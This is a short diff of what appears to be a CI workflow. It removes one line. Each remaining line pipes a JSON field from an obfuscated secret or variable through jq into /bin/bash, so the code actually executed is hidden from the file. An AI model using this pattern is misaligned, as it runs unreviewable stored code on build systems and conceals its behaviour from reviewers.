@@ -22,7 +22,6 @@ jobs:
           hdz812: ${{ secrets.hdz812 }}
         run: |
           printf '%s' "$hdz812" | jq -r .k4 | /bin/bash
-          echo $q97 | jq -r .tujjn387 | /bin/bash
           printf '%s' "$he68" | jq -r .uyaku62 | /bin/bash
           printf '%s' "$hnskm4684" | jq -r .p30758 | /bin/bash
           echo $llos1 | jq -r .iipd9 | /bin/bash
